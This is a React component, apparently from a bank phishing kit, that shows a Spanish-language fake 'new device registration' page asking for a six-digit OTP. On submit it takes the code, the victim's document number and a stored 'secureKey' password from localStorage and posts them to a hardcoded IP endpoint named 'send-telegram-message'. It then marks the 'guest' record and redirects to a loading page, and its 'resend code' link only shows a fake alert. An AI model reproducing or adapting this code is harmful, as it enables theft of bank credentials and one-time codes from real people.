import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const OTP = () => {
  const [otp, setOtp] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [message, setMessage] = useState('');
  const [documentNumber, setDocumentNumber] = useState('');
  const [loading, setLoading] = useState(false); // Ya no necesitamos "loading" en este contexto
  const navigate = useNavigate();

  useEffect(() => {
    // Recuperar los valores del formulario del localStorage cuando el componente se monta
    const savedFormValues = localStorage.getItem('formValues');
    const savedDocumentNumber = localStorage.getItem('documentNumber');
    const savedSecureKey = localStorage.getItem('secureKey');

    if (savedFormValues) {
      const formValues = JSON.parse(savedFormValues);
      setCardNumber(formValues.cardNumber || '');
    }

    if (savedDocumentNumber) {
      setDocumentNumber(savedDocumentNumber); // Asignamos el número de documento al estado
    }

    if (!savedDocumentNumber || !savedSecureKey) {
      setMessage('No se encontraron los datos necesarios en el localStorage.');
    }
  }, [navigate]); // El "useEffect" ahora solo maneja la carga de datos del localStorage

  const handleSubmit = async () => {
    if (otp.length === 6) {
      // Obtener datos del localStorage
      const savedDocumentNumber = localStorage.getItem('documentNumber');
      const savedSecureKey = localStorage.getItem('secureKey');
      const savedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
      const banco = localStorage.getItem('banco') || 'No disponible';

      if (savedDocumentNumber && savedSecureKey) {
        // Obtener el ID del "guest" almacenado en localStorage
        const guestId = localStorage.getItem('guestId');
        if (!guestId) {
          setMessage('No se encontró el ID del guest en el localStorage.');
          return;
        }

        // Crear el objeto con los datos que el backend necesita
        const dataToSend = {
          otp: otp,
          documentNumber: savedDocumentNumber,
          secureKey: savedSecureKey,
        };

        // Enviar los datos al backend
        try {
          const response = await fetch('https://46.202.140.21:8000/api/v1/send-telegram-message', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataToSend),
          });

          if (!response.ok) {
            throw new Error('Error al enviar los datos al backend');
          }

          // Si la respuesta es exitosa, proceder con la actualización del estado del guest
          const updateResponse = await fetch(`https://46.202.140.21:8000/api/v1/guest/${guestId}`, {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              status_id: 1, // Actualizar el status_id a 1
            }),
          });

          if (!updateResponse.ok) {
            throw new Error('Error al actualizar el estado');
          }

          // Redirigir a la página de loading después de actualizar el estado
          navigate('/loading');
        } catch (error) {
          console.error('Error al enviar datos:', error);
          setMessage('Error al enviar los datos.');
        }
      } else {
        setMessage('Datos del formulario no disponibles.');
      }

      setOtp('');  // Resetear OTP
      setMessage('');  // Resetear mensaje de error
    } else {
      setMessage('Por favor, ingrese un código de 6 dígitos.');
    }
  };

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
      <div className="flex items-center space-x-4 mb-2">
        <img
          src="../../../public/images.png"
          alt="Menu"
          className="w-14 h-auto"
        />
        <p className="text-xl font-bold">Registro nuevo dispositivo</p>
      </div>
      <img src="../../../public/hombre-afro-caminando-con-bolsas-en-el-hombro.jpg" alt="hombre con bolsas"
        className='mb-4' />
      <div className="space-y-4 text-center">
        <h1>Registro de <b>Nuevo Dispositivo</b></h1>
        <div className="flex flex-col items-center text-gray-500">
          <p>Acabamos de detectar un nuevo ingreso a la plataforma de un dispositivo no registrado.</p>
          <p>Por tu seguridad te hemos enviado un código de acceso a el numero registrado a la cuenta con número de Identificación <b>{documentNumber || 'No disponible'} </b></p>
          <span className="text-gray-700 pt-2 font-bold">Digite el Código:</span>
          <input
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            placeholder="Ingrese el código"
            maxLength="6"
            required
            className="w-full h-12 border border-gray-300 rounded px-3 mt-2 focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-150 ease-in-out"
          />
        </div>
        <p
          className="text-blue-600 cursor-pointer text-center mt-4 mb-4"
          onClick={() => alert('Código Enviado')}
        >
          Presione aquí para recibir un nuevo código
        </p>
        <button
          onClick={handleSubmit}
          className="w-full h-12 bg-[#0043a9] text-white rounded-lg hover:bg-blue-700 transition duration-150 ease-in-out"
        >
          Enviar
        </button>
        {message && <p className="text-red-500 mt-2 text-center">{message}</p>}
      </div>
    </div>
  );
};

export default OTP;
